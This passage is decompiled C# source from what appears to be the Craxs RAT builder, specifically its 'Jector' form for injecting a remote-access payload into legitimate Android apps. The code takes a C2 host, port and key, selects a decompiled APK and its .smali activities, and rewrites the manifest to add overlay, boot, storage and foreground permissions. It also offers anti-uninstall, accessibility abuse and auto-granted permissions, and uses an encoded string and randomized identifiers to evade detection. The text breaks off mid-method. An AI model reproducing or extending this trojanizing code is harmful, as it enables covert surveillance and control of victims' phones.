using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Craxs_Rat.My;
using DrakeUI.Framework;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Vip.Notification;

namespace Craxs_Rat
{
	// Token: 0x020000B9 RID: 185
	[DesignerGenerated]
	public partial class Jector : Form
	{
		// Token: 0x06000D3E RID: 3390 RVA: 0x0008BA68 File Offset: 0x00089C68
		public Jector()
		{
			base.FormClosing += this.Jector_FormClosing;
			base.Load += this.Jector_Load;
			this.string_1 = "AbddSfsvasDFBetgrnsrtnatrhjryghwrtgafsgfjbrTHAERgvergesrg";
			this.string_2 = "AbddSfsxasDFBetgrnsrteatrhjryghwrtjafsgfjbrTlAERevergesrg";
			this.string_3 = "AbddSfsvasDFBetgrnsrtnatrhjxyghwftgafsgxjbrTHAERdvergesrg";
			this.string_4 = "AbddSfsvasDFBetgrusrtuatfhjryghwstgafsgfjbrTHAERgvergesrg";
			this.string_5 = "AbddSfsvasDFBetgsnsrtnxtrhjryghwstgafsgsfjbrTHAERgvergesrg";
			this.string_6 = "AbddSfsvassDFBetzrnsrtnatrhjrcymhwrtgafsgfjbrmHAEugvergesrg";
			this.string_7 = "AbddSfsvasDtBetgrnvsrtnatrhjsryghwrtgafsgfjsbrTHAERgvergesrg";
			this.string_8 = "AbddSfsvasDFvBetgrnsrtnavtrhjryghwrtgafssgfjbrTHuqAERbgvergesrg";
			this.string_9 = "";
			this.string_10 = "";
			this.string_11 = "";
			this.string_12 = "";
			this.string_13 = "";
			this.string_14 = "AbddSfsvasDFvBetgrnsrtnavtrhjryghwrtgafssgfjbrTHuqAERbgvergesrg";
			this.string_15 = "";
			this.string_16 = "";
			this.string_17 = "";
			this.string_18 = "";
			this.string_19 = "";
			this.string_20 = "";
			this.string_21 = "";
			this.string_22 = "";
			this.string_23 = "";
			this.string_24 = "";
			this.string_25 = "";
			this.string_26 = "";
			this.string_27 = "";
			this.string_28 = "";
			this.string_29 = "";
			this.string_30 = "";
			this.string_31 = "";
			this.string_32 = "";
			this.string_33 = "";
			this.string_34 = "";
			this.string_35 = "";
			this.strings_0 = new List<string>();
			this.int_0 = 1;
			this.string_36 = "BSN12345678901234567";
			this.object_0 = false;
			this.object_1 = false;
			this.object_2 = false;
			this.object_3 = false;
			this.object_4 = false;
			this.object_5 = false;
			this.object_6 = false;
			this.random_0 = null;
			this.int_1 = 0;
			this.InitializeComponent();
		}

		// Token: 0x170003DB RID: 987
		// (get) Token: 0x06000D41 RID: 3393 RVA: 0x00006814 File Offset: 0x00004A14
		// (set) Token: 0x06000D42 RID: 3394 RVA: 0x0008E914 File Offset: 0x0008CB14
		internal virtual Label Label1 { get; set; }

		// Token: 0x170003DC RID: 988
		// (get) Token: 0x06000D43 RID: 3395 RVA: 0x0000681C File Offset: 0x00004A1C
		// (set) Token: 0x06000D44 RID: 3396 RVA: 0x0008E928 File Offset: 0x0008CB28
		internal virtual Label Label2 { get; set; }

		// Token: 0x170003DD RID: 989
		// (get) Token: 0x06000D45 RID: 3397 RVA: 0x00006824 File Offset: 0x00004A24
		// (set) Token: 0x06000D46 RID: 3398 RVA: 0x0008E93C File Offset: 0x0008CB3C
		internal virtual Label Label3 { get; set; }

		// Token: 0x170003DE RID: 990
		// (get) Token: 0x06000D47 RID: 3399 RVA: 0x0000682C File Offset: 0x00004A2C
		// (set) Token: 0x06000D48 RID: 3400 RVA: 0x0008E950 File Offset: 0x0008CB50
		internal virtual TextBox FolderPath { get; set; }

		// Token: 0x170003DF RID: 991
		// (get) Token: 0x06000D49 RID: 3401 RVA: 0x00006834 File Offset: 0x00004A34
		// (set) Token: 0x06000D4A RID: 3402 RVA: 0x0008E964 File Offset: 0x0008CB64
		internal virtual Button Button1
		{
			[CompilerGenerated]
			get
			{
				return this._Button1;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.Button1_Click);
				Button button = this._Button1;
				if (button != null)
				{
					button.Click -= value2;
				}
				this._Button1 = value;
				button = this._Button1;
				if (button != null)
				{
					button.Click += value2;
				}
			}
		}

		// Token: 0x170003E0 RID: 992
		// (get) Token: 0x06000D4B RID: 3403 RVA: 0x0000683C File Offset: 0x00004A3C
		// (set) Token: 0x06000D4C RID: 3404 RVA: 0x0008E9A8 File Offset: 0x0008CBA8
		internal virtual Button addactiv
		{
			[CompilerGenerated]
			get
			{
				return this._addactiv;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.addactiv_Click);
				Button addactiv = this._addactiv;
				if (addactiv != null)
				{
					addactiv.Click -= value2;
				}
				this._addactiv = value;
				addactiv = this._addactiv;
				if (addactiv != null)
				{
					addactiv.Click += value2;
				}
			}
		}

		// Token: 0x170003E1 RID: 993
		// (get) Token: 0x06000D4D RID: 3405 RVA: 0x00006844 File Offset: 0x00004A44
		// (set) Token: 0x06000D4E RID: 3406 RVA: 0x0008E9EC File Offset: 0x0008CBEC
		internal virtual Label Label5 { get; set; }

		// Token: 0x170003E2 RID: 994
		// (get) Token: 0x06000D4F RID: 3407 RVA: 0x0000684C File Offset: 0x00004A4C
		// (set) Token: 0x06000D50 RID: 3408 RVA: 0x0008EA00 File Offset: 0x0008CC00
		internal virtual TextBox log { get; set; }

		// Token: 0x170003E3 RID: 995
		// (get) Token: 0x06000D51 RID: 3409 RVA: 0x00006854 File Offset: 0x00004A54
		// (set) Token: 0x06000D52 RID: 3410 RVA: 0x0008EA14 File Offset: 0x0008CC14
		internal virtual Button Button3
		{
			[CompilerGenerated]
			get
			{
				return this._Button3;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.Button3_Click);
				Button button = this._Button3;
				if (button != null)
				{
					button.Click -= value2;
				}
				this._Button3 = value;
				button = this._Button3;
				if (button != null)
				{
					button.Click += value2;
				}
			}
		}

		// Token: 0x170003E4 RID: 996
		// (get) Token: 0x06000D53 RID: 3411 RVA: 0x0000685C File Offset: 0x00004A5C
		// (set) Token: 0x06000D54 RID: 3412 RVA: 0x0008EA58 File Offset: 0x0008CC58
		internal virtual Label Label4 { get; set; }

		// Token: 0x170003E5 RID: 997
		// (get) Token: 0x06000D55 RID: 3413 RVA: 0x00006864 File Offset: 0x00004A64
		// (set) Token: 0x06000D56 RID: 3414 RVA: 0x0008EA6C File Offset: 0x0008CC6C
		internal virtual CheckBox checksuper { get; set; }

		// Token: 0x170003E6 RID: 998
		// (get) Token: 0x06000D57 RID: 3415 RVA: 0x0000686C File Offset: 0x00004A6C
		// (set) Token: 0x06000D58 RID: 3416 RVA: 0x0008EA80 File Offset: 0x0008CC80
		internal virtual Label Label7 { get; set; }

		// Token: 0x170003E7 RID: 999
		// (get) Token: 0x06000D59 RID: 3417 RVA: 0x00006874 File Offset: 0x00004A74
		// (set) Token: 0x06000D5A RID: 3418 RVA: 0x0008EA94 File Offset: 0x0008CC94
		internal virtual Panel Panel1 { get; set; }

		// Token: 0x170003E8 RID: 1000
		// (get) Token: 0x06000D5B RID: 3419 RVA: 0x0000687C File Offset: 0x00004A7C
		// (set) Token: 0x06000D5C RID: 3420 RVA: 0x0008EAA8 File Offset: 0x0008CCA8
		internal virtual Panel Panel2 { get; set; }

		// Token: 0x1700040C RID: 1036
		// (get) Token: 0x06000D5D RID: 3421 RVA: 0x00006884 File Offset: 0x00004A84
		// (set) Token: 0x06000D5E RID: 3422 RVA: 0x0008EABC File Offset: 0x0008CCBC
		internal virtual ToolTip ToolTip1 { get; set; }

		// Token: 0x170003E9 RID: 1001
		// (get) Token: 0x06000D5F RID: 3423 RVA: 0x0000688C File Offset: 0x00004A8C
		// (set) Token: 0x06000D60 RID: 3424 RVA: 0x0008EAD0 File Offset: 0x0008CCD0
		internal virtual PictureBox PictureBox1 { get; set; }

		// Token: 0x170003EA RID: 1002
		// (get) Token: 0x06000D61 RID: 3425 RVA: 0x00006894 File Offset: 0x00004A94
		// (set) Token: 0x06000D62 RID: 3426 RVA: 0x0008EAE4 File Offset: 0x0008CCE4
		internal virtual CheckBox checkkill { get; set; }

		// Token: 0x170003EB RID: 1003
		// (get) Token: 0x06000D63 RID: 3427 RVA: 0x0000689C File Offset: 0x00004A9C
		// (set) Token: 0x06000D64 RID: 3428 RVA: 0x0008EAF8 File Offset: 0x0008CCF8
		internal virtual DrakeUITextBox Host { get; set; }

		// Token: 0x170003EC RID: 1004
		// (get) Token: 0x06000D65 RID: 3429 RVA: 0x000068A4 File Offset: 0x00004AA4
		// (set) Token: 0x06000D66 RID: 3430 RVA: 0x0008EB0C File Offset: 0x0008CD0C
		internal virtual DrakeUITextBox TheKey { get; set; }

		// Token: 0x170003ED RID: 1005
		// (get) Token: 0x06000D67 RID: 3431 RVA: 0x000068AC File Offset: 0x00004AAC
		// (set) Token: 0x06000D68 RID: 3432 RVA: 0x0008EB20 File Offset: 0x0008CD20
		internal virtual DrakeUITextBox Port { get; set; }

		// Token: 0x170003EE RID: 1006
		// (get) Token: 0x06000D69 RID: 3433 RVA: 0x000068B4 File Offset: 0x00004AB4
		// (set) Token: 0x06000D6A RID: 3434 RVA: 0x0008EB34 File Offset: 0x0008CD34
		internal virtual DrakeUITextBox CLiname { get; set; }

		// Token: 0x170003EF RID: 1007
		// (get) Token: 0x06000D6B RID: 3435 RVA: 0x000068BC File Offset: 0x00004ABC
		// (set) Token: 0x06000D6C RID: 3436 RVA: 0x0008EB48 File Offset: 0x0008CD48
		internal virtual DrakeUITabControlMenu maintapcontrols { get; set; }

		// Token: 0x170003F0 RID: 1008
		// (get) Token: 0x06000D6D RID: 3437 RVA: 0x000068C4 File Offset: 0x00004AC4
		// (set) Token: 0x06000D6E RID: 3438 RVA: 0x0008EB5C File Offset: 0x0008CD5C
		internal virtual TabPage TabPage1 { get; set; }

		// Token: 0x170003F1 RID: 1009
		// (get) Token: 0x06000D6F RID: 3439 RVA: 0x000068CC File Offset: 0x00004ACC
		// (set) Token: 0x06000D70 RID: 3440 RVA: 0x0008EB70 File Offset: 0x0008CD70
		internal virtual TabPage list_activ { get; set; }

		// Token: 0x170003F2 RID: 1010
		// (get) Token: 0x06000D71 RID: 3441 RVA: 0x000068D4 File Offset: 0x00004AD4
		// (set) Token: 0x06000D72 RID: 3442 RVA: 0x0008EB84 File Offset: 0x0008CD84
		internal virtual TabPage TabPage3 { get; set; }

		// Token: 0x170003F3 RID: 1011
		// (get) Token: 0x06000D73 RID: 3443 RVA: 0x000068DC File Offset: 0x00004ADC
		// (set) Token: 0x06000D74 RID: 3444 RVA: 0x0008EB98 File Offset: 0x0008CD98
		internal virtual TabPage TabPage4 { get; set; }

		// Token: 0x170003F4 RID: 1012
		// (get) Token: 0x06000D75 RID: 3445 RVA: 0x000068E4 File Offset: 0x00004AE4
		// (set) Token: 0x06000D76 RID: 3446 RVA: 0x0008EBAC File Offset: 0x0008CDAC
		internal virtual TabPage TabPage5 { get; set; }

		// Token: 0x170003F5 RID: 1013
		// (get) Token: 0x06000D77 RID: 3447 RVA: 0x000068EC File Offset: 0x00004AEC
		// (set) Token: 0x06000D78 RID: 3448 RVA: 0x0008EBC0 File Offset: 0x0008CDC0
		internal virtual DrakeUIListBox Activlist { get; set; }

		// Token: 0x170003F6 RID: 1014
		// (get) Token: 0x06000D79 RID: 3449 RVA: 0x000068F4 File Offset: 0x00004AF4
		// (set) Token: 0x06000D7A RID: 3450 RVA: 0x0008EBD4 File Offset: 0x0008CDD4
		internal virtual DrakeUIAvatar DrakeUIAvatar2 { get; set; }

		// Token: 0x170003F7 RID: 1015
		// (get) Token: 0x06000D7B RID: 3451 RVA: 0x000068FC File Offset: 0x00004AFC
		// (set) Token: 0x06000D7C RID: 3452 RVA: 0x0008EBE8 File Offset: 0x0008CDE8
		internal virtual Label Label6 { get; set; }

		// Token: 0x170003F8 RID: 1016
		// (get) Token: 0x06000D7D RID: 3453 RVA: 0x00006904 File Offset: 0x00004B04
		// (set) Token: 0x06000D7E RID: 3454 RVA: 0x0008EBFC File Offset: 0x0008CDFC
		internal virtual PictureBox PictureBox2 { get; set; }

		// Token: 0x170003F9 RID: 1017
		// (get) Token: 0x06000D7F RID: 3455 RVA: 0x0000690C File Offset: 0x00004B0C
		// (set) Token: 0x06000D80 RID: 3456 RVA: 0x0008EC10 File Offset: 0x0008CE10
		internal virtual DrakeUIAvatar DrakeUIAvatar4 { get; set; }

		// Token: 0x170003FA RID: 1018
		// (get) Token: 0x06000D81 RID: 3457 RVA: 0x00006914 File Offset: 0x00004B14
		// (set) Token: 0x06000D82 RID: 3458 RVA: 0x0008EC24 File Offset: 0x0008CE24
		internal virtual DrakeUITitlePanel DrakeUITitlePanel2
		{
			[CompilerGenerated]
			get
			{
				return this._DrakeUITitlePanel2;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.DrakeUITitlePanel2_Click);
				DrakeUITitlePanel drakeUITitlePanel = this._DrakeUITitlePanel2;
				if (drakeUITitlePanel != null)
				{
					drakeUITitlePanel.Click -= value2;
				}
				this._DrakeUITitlePanel2 = value;
				drakeUITitlePanel = this._DrakeUITitlePanel2;
				if (drakeUITitlePanel != null)
				{
					drakeUITitlePanel.Click += value2;
				}
			}
		}

		// Token: 0x170003FB RID: 1019
		// (get) Token: 0x06000D83 RID: 3459 RVA: 0x0000691C File Offset: 0x00004B1C
		// (set) Token: 0x06000D84 RID: 3460 RVA: 0x0008EC68 File Offset: 0x0008CE68
		internal virtual Label Label12 { get; set; }

		// Token: 0x170003FC RID: 1020
		// (get) Token: 0x06000D85 RID: 3461 RVA: 0x00006924 File Offset: 0x00004B24
		// (set) Token: 0x06000D86 RID: 3462 RVA: 0x0008EC7C File Offset: 0x0008CE7C
		internal virtual Label Label11 { get; set; }

		// Token: 0x170003FD RID: 1021
		// (get) Token: 0x06000D87 RID: 3463 RVA: 0x0000692C File Offset: 0x00004B2C
		// (set) Token: 0x06000D88 RID: 3464 RVA: 0x0008EC90 File Offset: 0x0008CE90
		internal virtual DrakeUITextBox msgtext { get; set; }

		// Token: 0x170003FE RID: 1022
		// (get) Token: 0x06000D89 RID: 3465 RVA: 0x00006934 File Offset: 0x00004B34
		// (set) Token: 0x06000D8A RID: 3466 RVA: 0x0008ECA4 File Offset: 0x0008CEA4
		internal virtual Label Label10 { get; set; }

		// Token: 0x170003FF RID: 1023
		// (get) Token: 0x06000D8B RID: 3467 RVA: 0x0000693C File Offset: 0x00004B3C
		// (set) Token: 0x06000D8C RID: 3468 RVA: 0x0008ECB8 File Offset: 0x0008CEB8
		internal virtual DrakeUITextBox titletext { get; set; }

		// Token: 0x17000400 RID: 1024
		// (get) Token: 0x06000D8D RID: 3469 RVA: 0x00006944 File Offset: 0x00004B44
		// (set) Token: 0x06000D8E RID: 3470 RVA: 0x0008ECCC File Offset: 0x0008CECC
		internal virtual DrakeUIAvatar DrakeUIAvatar5 { get; set; }

		// Token: 0x17000401 RID: 1025
		// (get) Token: 0x06000D8F RID: 3471 RVA: 0x0000694C File Offset: 0x00004B4C
		// (set) Token: 0x06000D90 RID: 3472 RVA: 0x0008ECE0 File Offset: 0x0008CEE0
		internal virtual Panel Panel3
		{
			[CompilerGenerated]
			get
			{
				return this._Panel3;
			}
			[CompilerGenerated]
			set
			{
				MouseEventHandler value2 = new MouseEventHandler(this.Panel3_MouseDown);
				Panel panel = this._Panel3;
				if (panel != null)
				{
					panel.MouseDown -= value2;
				}
				this._Panel3 = value;
				panel = this._Panel3;
				if (panel != null)
				{
					panel.MouseDown += value2;
				}
			}
		}

		// Token: 0x17000402 RID: 1026
		// (get) Token: 0x06000D91 RID: 3473 RVA: 0x00006954 File Offset: 0x00004B54
		// (set) Token: 0x06000D92 RID: 3474 RVA: 0x0008ED24 File Offset: 0x0008CF24
		internal virtual Label Label13 { get; set; }

		// Token: 0x17000403 RID: 1027
		// (get) Token: 0x06000D93 RID: 3475 RVA: 0x0000695C File Offset: 0x00004B5C
		// (set) Token: 0x06000D94 RID: 3476 RVA: 0x0008ED38 File Offset: 0x0008CF38
		internal virtual Label Label14 { get; set; }

		// Token: 0x17000404 RID: 1028
		// (get) Token: 0x06000D95 RID: 3477 RVA: 0x00006964 File Offset: 0x00004B64
		// (set) Token: 0x06000D96 RID: 3478 RVA: 0x0008ED4C File Offset: 0x0008CF4C
		internal virtual ComboBox ComboPrims { get; set; }

		// Token: 0x17000405 RID: 1029
		// (get) Token: 0x06000D97 RID: 3479 RVA: 0x0000696C File Offset: 0x00004B6C
		// (set) Token: 0x06000D98 RID: 3480 RVA: 0x0008ED60 File Offset: 0x0008CF60
		internal virtual Button removeactiv
		{
			[CompilerGenerated]
			get
			{
				return this._removeactiv;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.removeactiv_Click);
				Button removeactiv = this._removeactiv;
				if (removeactiv != null)
				{
					removeactiv.Click -= value2;
				}
				this._removeactiv = value;
				removeactiv = this._removeactiv;
				if (removeactiv != null)
				{
					removeactiv.Click += value2;
				}
			}
		}

		// Token: 0x17000406 RID: 1030
		// (get) Token: 0x06000D99 RID: 3481 RVA: 0x00006974 File Offset: 0x00004B74
		// (set) Token: 0x06000D9A RID: 3482 RVA: 0x0008EDA4 File Offset: 0x0008CFA4
		internal virtual CheckBox checkDraw { get; set; }

		// Token: 0x17000407 RID: 1031
		// (get) Token: 0x06000D9B RID: 3483 RVA: 0x0000697C File Offset: 0x00004B7C
		// (set) Token: 0x06000D9C RID: 3484 RVA: 0x0008EDB8 File Offset: 0x0008CFB8
		internal virtual DrakeUIAvatar DrakeUIAvatar6 { get; set; }

		// Token: 0x17000408 RID: 1032
		// (get) Token: 0x06000D9D RID: 3485 RVA: 0x00006984 File Offset: 0x00004B84
		// (set) Token: 0x06000D9E RID: 3486 RVA: 0x0008EDCC File Offset: 0x0008CFCC
		internal virtual CheckBox checkautoclick { get; set; }

		// Token: 0x17000409 RID: 1033
		// (get) Token: 0x06000D9F RID: 3487 RVA: 0x0000698C File Offset: 0x00004B8C
		// (set) Token: 0x06000DA0 RID: 3488 RVA: 0x0008EDE0 File Offset: 0x0008CFE0
		internal virtual ComboBox Comboinject { get; set; }

		// Token: 0x1700040A RID: 1034
		// (get) Token: 0x06000DA1 RID: 3489 RVA: 0x00006994 File Offset: 0x00004B94
		// (set) Token: 0x06000DA2 RID: 3490 RVA: 0x0008EDF4 File Offset: 0x0008CFF4
		internal virtual Label Label9 { get; set; }

		// Token: 0x06000DA3 RID: 3491 RVA: 0x0008EE08 File Offset: 0x0008D008
		public void method_0()
		{
			string left = Module4.smethod_1();
			if (Operators.CompareString(left, "AR", false) != 0)
			{
				if (Operators.CompareString(left, "CN", false) != 0)
				{
					this.Comboinject.Text = "Method 1";
					this.ComboPrims.Text = "Only Needed";
				}
				else
				{
					this.Comboinject.Text = "方法 1";
					this.ComboPrims.Text = "只需要";
					this.Label7.Text = "用户名";
					this.Label3.Text = "连接键";
					this.Label1.Text = "主机名或 IP";
					this.Label2.Text = "连接端口";
					this.Label4.Text = "目标应用文件夹";
					this.Button1.Text = "选择";
					this.Label5.Text = "目标活动文件 (.smali)";
					this.addactiv.Text = "添加";
					this.removeactiv.Text = "删除";
					this.checksuper.Text = "无障碍服务";
					this.checkkill.Text = "反删除";
					this.checkautoclick.Text = "自动授予权限";
					this.checkDraw.Text = "授予在应用程序上绘制";
					this.Label9.Text = "注射法";
					this.Label14.Text = "权限";
					this.Label10.Text = "通知标题";
					this.Label1.Text = "通知消息";
					this.Label12.Text = "自定义通知";
					this.Button3.Text = "开始";
					this.maintapcontrols.TabPages[0].Text = "联系";
					this.maintapcontrols.TabPages[1].Text = "目标";
					this.maintapcontrols.TabPages[2].Text = "选项";
					this.maintapcontrols.TabPages[3].Text = "注入";
					this.maintapcontrols.TabPages[4].Text = "关于";
				}
			}
			else
			{
				this.Comboinject.Text = "طريقة 1";
				this.ComboPrims.Text = "فقط المطلوبة";
				this.Label7.Text = "إسم المستخدم";
				this.Label3.Text = "مفتاح الاتصال";
				this.Label1.Text = "هوست او أيبي";
				this.Label2.Text = "المنفذ";
				this.Label4.Text = "مجلد التطبيق الهدف";
				this.Button1.Text = "إختيار";
				this.Label5.Text = "ملف الحقن الهدف (.smali)";
				this.addactiv.Text = "إضافة";
				this.removeactiv.Text = "حذف";
				this.checksuper.Text = "صلاحية الوصول";
				this.checkkill.Text = "منع الحذف";
				this.checkautoclick.Text = "صلاحيات تلقائية";
				this.checkDraw.Text = "صلاحية ظهور فوق التطبيقات";
				this.Label9.Text = "طريقة الحقن";
				this.Label14.Text = "الصلاحيات";
				this.Label10.Text = "عنوان الأشعار";
				this.Label1.Text = "محتوى الأشعار";
				this.Label12.Text = "إشعار مخصص";
				this.Button3.Text = "حقن";
				this.maintapcontrols.TabPages[0].Text = "الأتصال";
				this.maintapcontrols.TabPages[1].Text = "الهدف";
				this.maintapcontrols.TabPages[2].Text = "إعدادات";
				this.maintapcontrols.TabPages[3].Text = "بناء";
				this.maintapcontrols.TabPages[4].Text = "حول";
			}
		}

		// Token: 0x06000DA4 RID: 3492 RVA: 0x0008F214 File Offset: 0x0008D414
		public object method_1(int int_4, int int_5)
		{
			string text = "qazQAZwsxWSXedcEDCrfvRFVtgbTGByhnYHNujmUJMikIKolOLpP";
			if (this.staticLocalInitFlag_0 == null)
			{
				Interlocked.CompareExchange<StaticLocalInitFlag>(ref this.staticLocalInitFlag_0, new StaticLocalInitFlag(), null);
			}
			bool flag = false;
			try
			{
				Monitor.Enter(this.staticLocalInitFlag_0, ref flag);
				if (this.staticLocalInitFlag_0.State != 0)
				{
					if (this.staticLocalInitFlag_0.State == 2)
					{
						throw new IncompleteInitialization();
					}
				}
				else
				{
					this.staticLocalInitFlag_0.State = 2;
					this.random_1 = new Random();
				}
			}
			finally
			{
				this.staticLocalInitFlag_0.State = 1;
				if (flag)
				{
					Monitor.Exit(this.staticLocalInitFlag_0);
				}
			}
			int num = this.random_1.Next(int_4, int_5);
			StringBuilder stringBuilder = new StringBuilder();
			int num2 = num;
			checked
			{
				for (int i = 1; i <= num2; i++)
				{
					int startIndex = this.random_1.Next(0, text.Length);
					stringBuilder.Append(text.Substring(startIndex, 1));
				}
				ref int ptr = ref this.int_0;
				this.int_0 = ptr + 1;
				return stringBuilder.ToString() + Conversions.ToString(this.int_0);
			}
		}

		// Token: 0x06000DA5 RID: 3493 RVA: 0x0008F330 File Offset: 0x0008D530
		private int method_2(int int_4, int int_5)
		{
			if (this.staticLocalInitFlag_1 == null)
			{
				Interlocked.CompareExchange<StaticLocalInitFlag>(ref this.staticLocalInitFlag_1, new StaticLocalInitFlag(), null);
			}
			bool flag = false;
			try
			{
				Monitor.Enter(this.staticLocalInitFlag_1, ref flag);
				if (this.staticLocalInitFlag_1.State != 0)
				{
					if (this.staticLocalInitFlag_1.State == 2)
					{
						throw new IncompleteInitialization();
					}
				}
				else
				{
					this.staticLocalInitFlag_1.State = 2;
					this.random_2 = new Random();
				}
			}
			finally
			{
				this.staticLocalInitFlag_1.State = 1;
				if (flag)
				{
					Monitor.Exit(this.staticLocalInitFlag_1);
				}
			}
			return this.random_2.Next(int_4, int_5);
		}

		// Token: 0x06000DA6 RID: 3494 RVA: 0x0008F3DC File Offset: 0x0008D5DC
		private void Button1_Click(object sender, EventArgs e)
		{
			FolderBrowserDialog folderBrowserDialog = new FolderBrowserDialog();
			folderBrowserDialog.RootFolder = Environment.SpecialFolder.Desktop;
			folderBrowserDialog.SelectedPath = "C:\\";
			folderBrowserDialog.Description = "Select Path for Decompile Apk";
			if (folderBrowserDialog.ShowDialog() == DialogResult.OK)
			{
				this.FolderPath.Text = folderBrowserDialog.SelectedPath;
				this.string_0 = this.FolderPath.Text;
			}
		}

		// Token: 0x06000DA7 RID: 3495 RVA: 0x0008F43C File Offset: 0x0008D63C
		private void addactiv_Click(object sender, EventArgs e)
		{
			string text = Conversions.ToString(5);
			if (this.FolderPath.Text != null)
			{
				text = this.FolderPath.Text;
				OpenFileDialog openFileDialog = new OpenFileDialog();
				openFileDialog.InitialDirectory = text;
				openFileDialog.Multiselect = true;
				openFileDialog.DefaultExt = ".smali";
				openFileDialog.Title = "Select Path for Apk Activity to inject";
				string[] array = new string[3];
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					array = openFileDialog.FileNames;
					foreach (string text2 in array)
					{
						string text3 = text2;
						if (text3.ToLower().EndsWith(".smali") && !this.Activlist.Items.Contains(text3.Replace(text, ">")))
						{
							this.Activlist.Items.Add(text3.Replace(text, ">"));
						}
					}
				}
			}
			else
			{
				Alert.ShowWarning("Select Apk Folder First");
			}
		}

		// Token: 0x06000DA8 RID: 3496 RVA: 0x0008F534 File Offset: 0x0008D734
		private string method_4(string string_0)
		{
			return Encoding.UTF8.GetString(Convert.FromBase64String(string_0));
		}

		// Token: 0x06000DA9 RID: 3497 RVA: 0x0008F554 File Offset: 0x0008D754
		private void Button3_Click(object sender, EventArgs e)
		{
			this.log.Text = "";
			if (!this.method_11())
			{
				this.log.Text = "check values";
			}
			else
			{
				this.log.AppendText("Starting Injection...");
				this.method_6();
			}
		}

		// Token: 0x06000DAA RID: 3498 RVA: 0x0008F5A4 File Offset: 0x0008D7A4
		public void method_6()
		{
			checked
			{
				try
				{
					this.log.AppendText(Environment.NewLine + "Check Permissions...");
					string text = File.ReadAllText(this.string_0 + "\\AndroidManifest.xml");
					if (!text.ToLower().Contains(Conversions.ToString(NewLateBinding.LateGet(Module2.smethod_11("4joqEPvNeZJtcbG/QxXiIxVn8lY84/dNPoVWKn/qSL3IWlZFl1gJaVJvw7Z/qtZE"), null, "ToLower", new object[0], null, null, null))))
					{
						this.object_0 = true;
					}
					if (!text.ToLower().Contains("android.permission.READ_EXTERNAL_STORAGE".ToLower()))
					{
						this.object_1 = true;
					}
					if (!text.ToLower().Contains("android.permission.FOREGROUND_SERVICE".ToLower()))
					{
						this.object_2 = true;
					}
					if (!text.ToLower().Contains("android.permission.SYSTEM_ALERT_WINDOW".ToLower()))
					{
						this.object_3 = true;
					}
					if (!text.ToLower().Contains("android.permission.RECEIVE_BOOT_COMPLETED".ToLower()))
					{
						this.object_4 = true;
					}
					if (Operators.CompareString(this.ComboPrims.Text, "Only Needed", false) != 0)
					{
						this.object_5 = true;
						this.object_6 = true;
						string[] array = Module0.ALLPRIM.Split(new char[]
						{
							'#'
						});
						foreach (string text2 in array)
						{
							try
							{
								if (!string.IsNullOrEmpty(text2) && !text.ToLower().Contains(text2.ToLower()))
								{
									this.strings_0.Add(text2);
								}
							}
							catch (Exception ex)
							{
							}
						}
					}
					this.log.AppendText(Environment.NewLine + "Coding AndroidManifest...");
					this.int_0 = this.method_2(0, 5000);
					this.string_8 = Conversions.ToString(this.method_9(25, 35));
					this.string_5 = Conversions.ToString(this.method_9(25, 35));
					this.string_4 = Conversions.ToString(this.method_9(25, 35));
					this.string_3 = Conversions.ToString(this.method_9(25, 35));
					this.string_2 = Conversions.ToString(this.method_9(25, 35));
					this.string_1 = Conversions.ToString(this.method_9(25, 35));
					this.string_6 = Conversions.ToString(this.method_9(25, 35));
					this.string_14 = Conversions.ToString(this.method_9(25, 35));
					this.string_7 = Conversions.ToString(this.method_9(25, 35));
					this.string_9 = Conversions.ToString(this.method_9(25, 35));
					this.string_10 = Conversions.ToString(this.method_9(25, 35));
					this.string_11 = Conversions.ToString(this.method_9(25, 35));
					this.string_12 = Conversions.ToString(this.method_9(25, 35));
					this.string_13 = Conversions.ToString(this.method_9(25, 35));
					string[] array3 = File.ReadAllLines(this.string_0 + "\\AndroidManifest.xml");
					string[] array4 = File.ReadAllLines(this.string_0 + "\\apktool.yml");
					int num = array4.Length - 1;
					for (int j = 0; j <= num; j++)
					{
						if (array4[j].ToLower().Contains("targetSdkVersion".ToLower()))
						{
							array4[j] = "  targetSdkVersion: '29'";
							File.WriteAllLines(this.string_0 + "\\apktool.yml", array4);
							IL_385:
							int num2 = array3.Length - 1;
							for (int k = 1; k <= num2; k++)
							{
								if (Conversions.ToBoolean(Conversions.ToBoolean(this.object_0) && array3[k].ToLower().Contains("<uses-permission")))
								{
									array3[k] = array3[k] + "\r\n" + Module0.WritePrim;
									this.object_0 = false;
								}
								if (Conversions.ToBoolean(Conversions.ToBoolean(this.object_1) && array3[k].ToLower().Contains("<uses-permission")))
								{
									array3[k] = array3[k] + "\r\n" + Module0.ReadPrim;
									this.object_1 = false;
								}
								if (Conversions.ToBoolean(Conversions.ToBoolean(this.object_2) && array3[k].ToLower().Contains("<uses-permission")))
								{
									array3[k] = array3[k] + "\r\n" + Module0.FORGROUD;
									this.object_2 = false;
								}
								if (Conversions.ToBoolean(Conversions.ToBoolean(this.object_3) && array3[k].ToLower().Contains("<uses-permission")))
								{
									array3[k] = array3[k] + "\r\n" + Module0.SystemwindowPrim;
									this.object_3 = false;
								}
								if (Conversions.ToBoolean(Conversions.ToBoolean(this.object_4) && array3[k].ToLower().Contains("<uses-permission")))
								{
									array3[k] = array3[k] + "\r\n" + Module0.BootPrim;
									this.object_4 = false;
								}
								if (Conversions.ToBoolean(Conversions.ToBoolean(this.object_5) && array3[k].ToLower().Contains("<uses-permission")))
								{
									try
									{
										foreach (string str in this.strings_0)
										{
											array3[k] = array3[k] + "\r\n" + str;
										}
									}
									finally
									{
										List<string>.Enumerator enumerator;
										((IDisposable)enumerator).Dispose();
									}
									this.object_5 = false;
								}
								if (array3[k].ToLower().Contains("<application"))
								{
									if (!array3[k].ToLower().Contains("requestLegacyExternalStorage".ToLower()))
									{
